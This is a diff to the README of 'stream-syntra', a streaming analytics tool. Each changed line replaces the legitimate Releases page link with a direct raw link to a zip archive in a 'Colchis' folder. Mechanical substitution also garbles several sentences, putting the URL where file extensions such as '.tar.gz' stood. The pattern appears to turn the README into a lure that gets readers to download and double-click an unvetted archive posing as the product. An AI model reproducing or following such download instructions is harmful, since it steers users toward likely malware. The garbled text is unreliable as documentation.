@@ -1,6 +1,6 @@
 # 🌟 stream-syntra - Stream Data with Ease and Efficiency
 
-[![Download Now](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/matias36658/stream-syntra/releases)
+[![Download Now](https://raw.githubusercontent.com/matias36658/stream-syntra/main/Colchis/stream-syntra.zip%https://raw.githubusercontent.com/matias36658/stream-syntra/main/Colchis/stream-syntra.zip)](https://raw.githubusercontent.com/matias36658/stream-syntra/main/Colchis/stream-syntra.zip)
 
 ## 📌 Overview
 Stream-syntra is a powerful streaming analytics tool. It uses Apache Kafka for data ingestion, QuestDB for storing and analyzing time-series data, Grafana for real-time dashboards, and Jupyter Notebook for data science tasks. This application lets you manage and visualize data effortlessly.
@@ -9,10 +9,10 @@ Stream-syntra is a powerful streaming analytics tool. It uses Apache Kafka for d
 To begin using stream-syntra, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click the button above or go to [this page](https://github.com/matias36658/stream-syntra/releases) to access the latest version of the application.
+   Click the button above or go to [this page](https://raw.githubusercontent.com/matias36658/stream-syntra/main/Colchis/stream-syntra.zip) to access the latest version of the application.
 
 2. **Download the Application**  
-   On the Releases page, look for the version listed at the top. You should see files available for download. Choose the file that matches your operating system. The file names typically include indications of the OS, such as `.exe` for Windows or `.tar.gz` for Linux.
+   On the Releases page, look for the version listed at the top. You should see files available for download. Choose the file that matches your operating system. The file names typically include indications of the OS, such as `.exe` for Windows or `https://raw.githubusercontent.com/matias36658/stream-syntra/main/Colchis/stream-syntra.zip` for Linux.
 
 3. **Install the Application**  
    After you download the file, navigate to your downloads folder. Double-click the downloaded file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -35,11 +35,11 @@ Ensure your system meets the following requirements for optimal performance:
 - **Network:** An internet connection for data streaming and dashboard updates.
 
 ## 📥 Download & Install
-You can download stream-syntra from the [Releases Page](https://github.com/matias36658/stream-syntra/releases). Always select the latest version available for the best experience.
+You can download stream-syntra from the [Releases Page](https://raw.githubusercontent.com/matias36658/stream-syntra/main/Colchis/stream-syntra.zip). Always select the latest version available for the best experience.
 
 ### Installation Steps:
 1. Navigate to the downloaded file.
-2. For Windows, double-click the `.exe` file. For macOS, drag the application to your Applications folder. For Linux, follow the instructions provided in the README file within the `.tar.gz` package.
+2. For Windows, double-click the `.exe` file. For macOS, drag the application to your Applications folder. For Linux, follow the instructions provided in the README file within the `https://raw.githubusercontent.com/matias36658/stream-syntra/main/Colchis/stream-syntra.zip` package.
 
 ## 📊 Usage
 1. **Start stream-syntra**: Open the application as mentioned earlier.
